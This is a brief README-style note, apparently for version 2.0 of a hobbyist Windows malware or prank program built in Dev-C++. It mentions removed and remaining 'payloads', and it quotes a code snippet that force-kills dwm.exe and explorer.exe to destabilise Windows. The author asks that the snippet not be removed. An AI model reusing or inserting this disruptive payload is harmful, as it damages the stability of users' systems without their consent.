Warning:
2.0 version may contain some bugs (like payload hang that happened on the icon payload,
I removed the icon payload) and a lib file inside the source code, so, try putting the lib
file to the coder that you have (unless if you use Dev-C++)

Note:
if you use Dev-C++, then you can easily customize it and use all payloads, also if you want to make
your own 3.0 version, then please don't remove the payloads I added (unless if they show error)
please be careful, if you accdientally execute the malware without warning, theres a command
prompt code

the code:
System("taskkill /f /im dwm.exe")
Sleep(10);
System("taskkill /f /im dwm.exe")
System("taskkill /f /im explorer.exe")

it will literally make your Windows (only above 8.1) unstable, but please don't remove these codes :(